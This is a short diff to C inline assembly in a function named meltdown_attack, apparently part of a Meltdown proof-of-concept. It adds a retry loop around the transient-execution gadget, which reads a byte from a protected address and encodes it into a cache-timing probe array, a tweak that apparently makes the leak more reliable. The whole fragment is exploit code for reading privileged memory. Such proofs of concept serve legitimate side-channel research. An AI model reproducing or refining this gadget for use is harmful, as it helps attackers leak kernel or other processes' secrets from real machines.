@@ -136,10 +136,12 @@ static void __attribute__((noinline)) meltdown_attack(char* addr)
 		"add $0x141, %%rax\n\t"
 		".endr\n\t"
 
+        "retry:\n\t"
 		"movzx (%[addr]), %%rax\n\t"
         "shl $12, %%rax\n\t"
-        "mov (%[target], %%rax, 1), %%rbx\n"
-		:
+        "mov (%[target], %%rax, 1), %%rbx\n\t"
+		"jz retry\n"
+        :
 		: [target] "r" (cache),
 		  [addr] "r" (addr)
 		: "rax","rbx"
